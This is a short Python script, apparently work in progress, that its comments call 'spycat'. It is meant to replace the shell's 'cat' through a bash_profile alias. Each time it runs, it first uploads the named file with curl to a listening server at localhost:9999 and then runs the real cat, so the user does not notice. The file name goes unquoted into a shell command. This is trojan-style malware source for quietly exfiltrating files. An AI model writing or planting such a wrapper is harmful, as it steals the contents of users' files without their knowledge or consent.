import sys
import subprocess


#TODO Add to doc how to update the bash_profile to have this 
# spycat by the one used instead of real 'cat'

def main(*args):
  filename = " ".join(args[0])
  #TODO handle command line arguments passed to 'cat'
  cmds = ["curl -s http://localhost:9999 -F 'file=@{0}'".format(filename)]
  
  print(args[0])
  cat_cmd = " ".join(args[0])
  print(cat_cmd)
  cmds.append("cat " + filename)
  print(cmds)  
  
  #TODO create loop to execute bad command first followed by legit 'cat'
  for cmd in cmds:
      result = subprocess.check_output(cmd, shell=True)
      print(result)

if __name__ == "__main__":

  #TODO get rid of this since cat will be name and can simplify 
  # append statement above and reduce code size
  # easier to test tho this way lol
  args = sys.argv[1:]
  main(args)


